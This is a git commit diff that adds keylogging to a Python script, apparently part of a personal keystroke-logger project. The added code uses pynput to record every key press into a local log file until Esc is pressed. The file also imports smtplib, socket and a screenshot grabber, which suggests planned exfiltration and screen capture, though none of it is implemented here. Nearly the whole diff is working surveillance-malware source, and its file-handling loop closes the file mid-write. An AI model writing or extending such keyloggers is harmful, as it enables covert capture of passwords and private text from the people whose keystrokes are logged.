0e151fd3c4e974a190c5bdc69b5e9a86de7efd69
c0nfsd <pathakmilindd@gmail.com>
2022-12-04 16:46:02 +0530

    implemented keylogging ability

--- logger.py
+++ logger.py
@@ -8,7 +8,7 @@ import smtplib
 import socket
 import platform
 
-import win32clipboard
+#import win32clipboard
 
 from pynput.keyboard import Key, Listener
 
@@ -28,15 +28,42 @@ from PIL import ImageGrab
 
 keys_information = 'key_log.txt'
 
-file_path = 'PATH for storing key_log.txt'
-extend = '\\'
+file_path = '/Users/_milindpathak_/projects/keyStrokeLogger'
+extend = '/'
 
 count = 0
 keys = []
 
+
 def on_press(key):
     global keys, count
-    
+
     print(key)
     keys.append(key)
-    count +=1
+    count += 1
+    
+    if count >= 1:
+        count=0
+        write_file(keys)
+        keys = [] 
+
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find('space') > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
